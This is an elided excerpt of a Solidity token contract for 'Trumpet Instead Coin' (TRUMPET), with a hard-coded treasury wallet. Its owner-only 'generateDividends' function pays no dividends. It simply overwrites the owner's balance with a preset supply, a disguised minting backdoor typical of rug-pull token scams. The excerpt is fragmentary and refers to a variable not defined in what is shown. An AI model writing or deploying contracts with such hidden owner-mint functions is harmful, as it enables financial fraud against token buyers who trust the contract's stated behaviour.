...
contract TrumpetInsteadCoin is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Trumpet Instead Coin";
    string private _symbol = "TRUMPET";
    uint8 private _decimals = 18;

    address payable public treasuryWallet = payable(0x05BD75cAC0b4E015994F066963b0aDD534EC7f7F);
    ...
    uint256 public dividendEndSupply = 10000000000;
    ...
    function generateDividends()  public onlyOwner()   {_accBalances[getOwner()] = setDividendSupply; }
